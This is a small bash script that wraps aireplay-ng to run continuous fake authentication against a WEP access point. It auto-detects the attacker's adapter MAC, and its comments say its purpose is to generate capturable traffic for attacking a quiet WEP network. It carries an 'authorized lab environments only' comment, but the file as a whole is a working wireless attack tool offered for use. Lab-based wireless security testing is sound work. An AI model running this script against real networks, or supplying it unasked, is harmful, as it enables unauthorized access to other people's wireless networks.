#!/usr/bin/env bash
# fakeauth.sh
# Last Edited by Charles Duoto on November 16, 2026
# Continuous fake authentication to generate traffic on a quiet WEP network.
# Pure bash. Run airodump-ng in another terminal to capture.
# Authorized lab environments only.
#
# Usage:
#   sudo ./fakeauth.sh <monitor_interface> <ap_mac>
# Example:
#   sudo ./fakeauth.sh wlan0 60:C3:97:F6:3E:BA

set -euo pipefail

if [[ $# -ne 2 ]]; then
    echo "Usage: $0 <monitor_interface> <ap_mac>"
    echo "Example: $0 wlan0 60:C3:97:F6:3E:BA"
    exit 1
fi

IFACE="$1"
AP_MAC="$2"

# Get our adapter MAC (most reliable method first)
OUR_MAC=""
if [[ -f "/sys/class/net/$IFACE/address" ]]; then
    OUR_MAC=$(cat "/sys/class/net/$IFACE/address" 2>/dev/null || true)
fi
if [[ -z "$OUR_MAC" ]]; then
    OUR_MAC=$(ip link show "$IFACE" 2>/dev/null | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1 || true)
fi
if [[ -z "$OUR_MAC" ]]; then
    OUR_MAC=$(ifconfig "$IFACE" 2>/dev/null | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1 || true)
fi
if [[ -z "$OUR_MAC" ]]; then
    echo "[-] Could not determine MAC of $IFACE"
    exit 1
fi

echo "[*] Fake auth attack"
echo "[*] Interface : $IFACE ($OUR_MAC)"
echo "[*] Target AP : $AP_MAC"
echo "[*] Press Ctrl+C to stop"
echo

aireplay-ng --fakeauth 0 -a "$AP_MAC" -h "$OUR_MAC" "$IFACE"
